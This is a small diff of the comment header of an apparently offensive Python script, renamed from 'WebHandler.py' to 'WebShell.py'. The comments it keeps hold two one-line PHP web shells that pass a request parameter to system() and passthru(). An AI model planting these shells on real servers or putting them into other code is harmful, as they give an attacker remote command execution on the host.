@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# WebHandler.py works for POST and GET requests:
+# WebShell.py works for POST requests:
 
 # <?php system($_POST['cmd']); ?>
 # <?php passthru($_REQUEST['cmd']); ?>
